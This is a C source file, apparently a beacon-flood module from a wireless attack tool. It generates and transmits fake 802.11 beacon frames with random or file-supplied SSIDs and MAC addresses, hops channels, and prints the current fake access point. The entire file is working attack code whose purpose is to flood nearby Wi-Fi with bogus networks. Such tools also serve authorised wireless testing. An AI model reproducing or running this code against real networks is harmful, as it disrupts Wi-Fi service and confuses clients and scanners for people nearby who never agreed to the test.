#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#include "mybeacon_flood.h"
#include "osdep.h"
#include "helpers.h"
#include "infomessage.h"
#include "beaconfloodstop.h"


#define BEACON_FLOOD_MODE 'b'
#define BEACON_FLOOD_NAME "Beacon Flooding"



struct beacon_flood_options {
  char *ssid;
  char *ssid_filename;
  char *mac_ssid_filename;
  unsigned char all_chars;
  unsigned char type;
  char encryptions[5];
  char bitrates;
  unsigned char validapmac;
  unsigned char hopto;
  uint8_t channel;
  uint8_t use_channel;
  unsigned int speed;
  unsigned char *ies;
  int ies_len;
};

//Global things, shared by packet creation and stats printing
char *ssid = NULL;
struct ether_addr bssid;
int curchan = 0;
char my_info_buffer[1024];


void *beacon_flood_parse() {
  int opt, ch;
  unsigned int i;
  struct beacon_flood_options *bopt = malloc(sizeof(struct beacon_flood_options));
  
  bopt->ssid = NULL;
  bopt->ssid_filename = NULL;
  bopt->mac_ssid_filename = NULL;
  bopt->all_chars = 0;
  bopt->type = 2;
  strcpy(bopt->encryptions, "nwta");
  bopt->bitrates = 'a';
  bopt->validapmac = 0;
  bopt->hopto = 0;
  bopt->channel = 0;
  bopt->use_channel = 0;
  bopt->speed = 50;
  bopt->ies = NULL;
  bopt->ies_len = 0;
  
  
  return (void *) bopt;
}


struct packet beacon_flood_getpacket(void *options) {
  struct beacon_flood_options *bopt = (struct beacon_flood_options *) options;
  struct packet pkt;
  static unsigned int packsent = 0, encindex;
  static time_t t_prev = 0;
  static int freessid = 0, freeline = 0;
  unsigned char bitrate, adhoc;
  static char *line = NULL;
 

  if (bopt->hopto) {
    packsent++;
    if ((packsent == 50) || ((time(NULL) - t_prev) >= 3)) {
      // Switch Channel every 50 frames or 3 seconds
      packsent = 0; t_prev = time(NULL);
      if (bopt->use_channel) curchan = (int) bopt->channel;
      else curchan = (int) generate_channel();
      osdep_set_channel(curchan);
    }
  } else if (bopt->use_channel) {
    curchan = bopt->channel;
  } else {
    curchan = (int) generate_channel();
  }

  if (bopt->validapmac) bssid = generate_mac(MAC_KIND_AP);
  else bssid = generate_mac(MAC_KIND_RANDOM);

  if (freessid && ssid) free(ssid);	//We need to keep those just before we change them
  if (freeline && line) free(line);	//To print SSID in print_stats!
  if (bopt->ssid) {
    ssid = bopt->ssid;
  } else if (bopt->ssid_filename) {
    do { ssid = read_next_line(bopt->ssid_filename, 0); } while (ssid == NULL);
    freessid = 1;
  } else if (bopt->mac_ssid_filename) {
    do {
      do { line = read_next_line(bopt->mac_ssid_filename, 0); } while (line == NULL);
      ssid = strchr(line, ' ');
      bssid = parse_mac(line);
      if (! ssid) { printf("Skipping malformed line: %s\n", line); free(line); }
      else ssid++; //Skip the whitespace
      freeline = 1;
    } while (ssid == NULL);
  } else {
    ssid = generate_ssid(bopt->all_chars);
    freessid = 1;
  }
  
  encindex = random() % strlen(bopt->encryptions);
  
  if (bopt->bitrates == 'a') {
    if (random() % 2) bitrate = 11;
    else bitrate = 54;
  } else if (bopt->bitrates == 'b') {
    bitrate = 11;
  } else {
    bitrate = 54;
  }
  
  if (bopt->type == 2) {
    if (random() % 2) adhoc = 0;
    else adhoc = 1;
  } else if (bopt->type == 1) {
    adhoc = 1;
  } else {
    adhoc = 0;
  }
  
  pkt = create_beacon(bssid, ssid, (uint8_t) curchan, bopt->encryptions[encindex], bitrate, adhoc);
  if (bopt->ies) append_data(&pkt, bopt->ies, bopt->ies_len);
  
  sleep_till_next_packet(bopt->speed);
  return pkt;
}

void beacon_flood_print_stats(void *options) {
  struct beacon_flood_options *bopt = (struct beacon_flood_options *) options;
  uint8_t *p;

  printf("\rCurrent MAC: "); print_mac(bssid);

   p = bssid.ether_addr_octet;
  snprintf(my_info_buffer, sizeof(my_info_buffer), "Current MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
  info_message(my_info_buffer, UPDATE_SUCCESS);
  if (bopt->all_chars) {
    printf(" on Channel %2d              \n", curchan);
    snprintf(my_info_buffer, sizeof(my_info_buffer), " on Channel %2d\n", curchan);
    info_message(my_info_buffer, UPDATE_SUCCESS);
  } else {
    printf(" on Channel %2d with SSID: %s\n", curchan, ssid);
    snprintf(my_info_buffer, sizeof(my_info_buffer), " on Channel %2d with SSID: %s\n", curchan, ssid);
    info_message(my_info_buffer, UPDATE_SUCCESS);
  }
}

void beacon_flood_perform_check(void *options) {
  //Nothing to check for beacon flooding attacks
  options = options; //Avoid unused warning
}

struct attacks load_beacon_flood() {
  struct attacks this_attack;
  char *beacon_flood_name = malloc(strlen(BEACON_FLOOD_NAME) + 1);
  strcpy(beacon_flood_name, BEACON_FLOOD_NAME);


  this_attack.parse_options = (fpo) beacon_flood_parse;
  this_attack.get_packet = (fpp) beacon_flood_getpacket;
  this_attack.print_stats = (fps) beacon_flood_print_stats;
  this_attack.perform_check = (fps) beacon_flood_perform_check;
  this_attack.mode_identifier = BEACON_FLOOD_MODE;
  this_attack.attack_name = beacon_flood_name;

  return this_attack;
}